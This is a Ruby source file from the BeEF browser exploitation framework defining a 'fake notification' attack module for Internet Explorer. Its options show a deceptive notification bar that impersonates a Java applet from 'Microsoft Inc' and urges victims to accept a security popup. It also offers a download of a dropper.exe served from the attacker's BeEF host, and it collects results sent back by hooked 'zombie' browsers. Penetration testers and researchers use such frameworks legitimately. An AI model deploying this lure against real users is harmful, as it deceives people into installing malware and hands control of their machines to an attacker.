#
# Copyright (c) 2006-2023 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Fake_notification_ie < BeEF::Core::Command
  def self.options
    @configuration = BeEF::Core::Configuration.instance
    proto = @configuration.beef_proto
    beef_host = @configuration.beef_host
    beef_port = @configuration.beef_port
    base_host = "#{proto}://#{beef_host}:#{beef_port}"

    [
      { 'name' => 'url', 'ui_label' => 'URL', 'value' => "#{base_host}/dropper.exe", 'width' => '150px' },
      { 'name' => 'notification_text',
        'description' => 'Text displayed in the notification bar',
        'ui_label' => 'Notification text',
        'value' => "This website wants to run the following applet: 'Java' from 'Microsoft Inc'. To continue using this website you must accept the following security popup" }
    ]
  end

  #
  # This method is being called when a zombie sends some
  # data back to the framework.
  #
  def post_execute
    content = {}
    content['result'] = @datastore['result']
    save content
  end
end
